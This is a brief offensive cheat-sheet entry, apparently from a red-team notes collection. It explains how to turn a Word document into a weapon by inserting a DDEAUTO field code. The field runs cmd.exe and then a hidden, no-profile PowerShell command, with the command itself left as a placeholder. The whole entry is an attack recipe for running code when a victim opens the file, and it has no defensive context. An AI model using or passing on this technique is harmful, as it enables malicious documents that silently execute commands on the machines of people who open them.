### Create Dynamic Data Exchange inside Word document
```
Insert &gt; Quick Parts (Icon with arrow down) &gt; Field
= (Formula) &gt; OK
Right click on "!Unexpected End of Formula" &gt; Toggle Field Codes
Replace { = \* MERGEFORMAT } &gt; { DDEAUTO "c:\\windows\\system32\\cmd.exe /c powershell.exe -nop -w hidden &lt;command&gt;" "title"}
```


